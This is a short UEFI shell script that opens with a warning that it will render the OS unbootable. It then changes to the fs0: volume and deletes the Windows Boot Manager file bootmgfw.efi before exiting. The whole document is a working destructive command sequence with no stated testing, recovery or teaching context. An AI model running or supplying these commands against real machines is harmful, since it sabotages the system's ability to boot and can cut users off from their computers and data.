echo * This will render the OS unbootable without recovery tool *
echo Deleting Windows Boot Manager...
fs0:
rm \EFI\Microsoft\Boot\bootmgfw.efi
map
exit
